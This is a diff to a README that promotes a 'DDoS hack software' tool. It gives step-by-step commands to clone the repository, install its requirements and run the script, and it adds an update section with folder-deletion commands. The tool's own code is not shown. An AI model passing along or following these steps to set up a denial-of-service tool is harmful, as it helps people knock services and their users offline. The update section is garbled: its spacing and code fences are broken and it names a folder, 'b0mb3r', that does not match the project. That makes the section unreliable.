@@ -8,7 +8,7 @@ The best free DDoS software in 2021
 3. Clone the repository using git and navigate to the folder
     ```bash
     git clone https://github.com/giddosdownload/GiDDOS-HackSoftware.git
-    cd GiDDOS-HackSoftware-v-1-3
+    cd GiDDOS-HackSoftware/GiDDOS-HackSoftware-v-1-3
     ```
 4. Install all required libraries and run the script
     ```bash
@@ -26,10 +26,22 @@ The best free DDoS software in 2021
 3. Clone the repository using git and navigate to the folder
     ```bash
     git clone https://github.com/giddosdownload/GiDDOS-HackSoftware.git
-    cd GiDDOS-HackSoftware-v-1-3
+    cd GiDDOS-HackSoftware/GiDDOS-HackSoftware-v-1-3
     ```
 4. Install all required libraries and run the script
     ```bash
     pip install -r req.txt
     python main.py
     ```
+# Update
+## For Windows
+1. Enter the following command to remove the previous version:
+     Bash
+     rmdir / S / Q b0mb3r
+     ``
+2. Follow the steps from step 3 of the Windows installation instructions.
+## For Android
+1. Enter the following command to uninstall the previous version:
+     Bash
+     rm -rf b0mb3r
+     ``
